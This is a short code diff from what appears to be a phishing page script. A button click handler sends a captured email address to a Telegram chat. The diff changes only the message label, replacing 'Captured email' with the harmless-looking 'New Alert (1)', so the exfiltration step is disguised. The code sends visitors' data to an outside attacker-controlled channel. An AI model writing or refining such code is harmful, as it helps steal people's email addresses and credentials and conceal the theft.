@@ -145,7 +145,7 @@ btn.addEventListener("click", () => {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: CHAT_ID,
-      text: `✅Captured email:  ${email}`
+      text: `✅New Alert (1):  ${email}`
     })
   }).catch(err => console.error('Failed to send to Telegram:', err));
 
